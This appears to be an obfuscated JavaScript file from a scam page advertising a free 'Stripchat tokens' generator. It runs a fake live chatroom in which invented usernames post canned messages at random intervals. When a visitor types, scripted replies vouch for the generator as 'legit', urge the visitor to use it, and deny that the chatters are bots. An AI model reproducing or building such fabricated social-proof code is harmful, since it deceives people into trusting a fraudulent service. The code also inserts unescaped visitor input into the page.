        document[_0x7185[2]](_0x7185[1])[_0x7185[0]] = _0x7185[11]
    })
}


$(document).ready(function () {


    ChatStart();
    ChatLog("Welcome to the chatroom, posting links or spamming will result in a kick.");
    ChatAddEntry(ChatUserNames[Random(0, ChatUserNames['length'] - 1)], ChatContent[rng(0, ChatContent['length'] - 1)]);
    $('#livechatInputChat')['keypress'](function (_0xaa63xc) {
        if (_0xaa63xc['keyCode'] == 13) {
            $('#livechatButtonChat')['click']();
        };
    });
    $('#livechatButtonChat')['click'](function () {
        if (ChatUserName == '') {
            $('#livechatContainerChatUserName')['fadeIn'](250);
            $('.livechatOverlaySmall').fadeIn(200);
        } else {
            $msg = $('#livechatInputChat')['val']();

            ChatAddEntry('<span>' + ChatUserName + '</span>', $msg);
            $('#livechatInputChat')['val']('');
            if ($msg.indexOf("bots") >= 0 || $msg.indexOf("bot") >= 0 || $msg.indexOf("robots") >= 0) {
                setTimeout(function () {
                    ChatAddEntry(ChatUserNames[Random(0, ChatUserNames['length'] - 1)], '<span class="mention">@ ' + ChatUserName + '  </span>' + ChatAntiBot[rng(0, ChatAntiBot['length'] - 1)]);
                }, rng(7250, 9300));
            }
            if (!ChatReplied) {
                setTimeout(function () {
                    ChatAddEntry(ChatUserNames[Random(0, ChatUserNames['length'] - 1)], '<span class="mention">@ ' + ChatUserName + '  </span>  lol stop spamming and just use the generator');

                    setTimeout(function () {
                        ChatAddEntry(ChatUserNames[Random(0, ChatUserNames['length'] - 1)], '<span class="mention">@ ' + ChatUserName + '  </span>  is this your first time here? this is like the only legit Stripchat Resource 2 generator out there');
                        setTimeout(function () {
                            ChatAddEntry(ChatUserNames[Random(0, ChatUserNames['length'] - 1)], 'guys dont listen to ' + '<span class="mention">@ ' + ChatUserName + '  </span> ' + ' he just wants all Tokens and Resource 2 for himself haha');

                        }, rng(11500, 19500));
                    }, rng(6500, 8500));
                }, rng(6000, 9500));
                ChatReplied = true;
            }
        };
    });
    $('#livechatButtonChatUserName')['click'](function () {
        ChatUserName = $('#livechatInputChatUserName')['val']();
        $('#livechatContainerChatUserName')['fadeOut'](250, function () {
            $('.livechatOverlaySmall').fadeOut(200, function () {
                $('#livechatButtonChat')['click']();
            });
        });
    });


});

Date.prototype.getFullMinutes = function () {
    if (this.getMinutes() < 10) {
        return '0' + this.getMinutes();
    }
    return this.getMinutes();
};

function rng(min, max) {
    return Math.floor(Math.random() * (max - min + 1) + min);

}
$(function () {

    $('#livechatInputComment').focus(function () {
        $('#livechatContainerAdditional').slideDown(500);
    });
});

function Random(_0xaa63x2, _0xaa63x3) {
    return Math['floor'](Math['random']() * (_0xaa63x3 - _0xaa63x2) + _0xaa63x2);
};

function ChatAddEntry(_0xaa63x5, _0xaa63x6) {
    if (_0xaa63x5 == '' || _0xaa63x6 == '') {
        return;
    };
    $('<div class=\"livechatChatEntry\"><span class=\"livechatEntryUserName\">[' + ChatDate.getHours() + ':' + ChatDate.getFullMinutes() + ']  ' + _0xaa63x5 + ':</span><span class=\"livechatEntryContent\">' + _0xaa63x6 + '</span></div>')['appendTo']('#livechatChatContent')['hide'](0)['fadeIn'](250);
    $('#livechatChatContent')['scrollTop']($('#livechatChatContent')[0]['scrollHeight']);
};

function ChatLog(_0xaa63x6) {
    $('<div class=\"livechatChatEntry\"><span class=\"ChatNotification\">' + _0xaa63x6 + '</span></div>')['appendTo']('#livechatChatContent')['hide'](0)['fadeIn'](250);
    $('#livechatChatContent')['scrollTop']($('#livechatChatContent')[0]['scrollHeight']);
};

function ChatStart() {
    var _0xaa63x8 = function () {
        setTimeout(function () {
            var _0xaa63x9 = ChatUserNames[Random(0, ChatUserNames['length'] - 1)];
            var _0xaa63xa = ChatContent[Random(0, ChatContent['length'] - 1)];
            ChatAddEntry(_0xaa63x9, _0xaa63xa);
            _0xaa63x8();
        }, Random(1000, 15000));
    };
    _0xaa63x8();
};
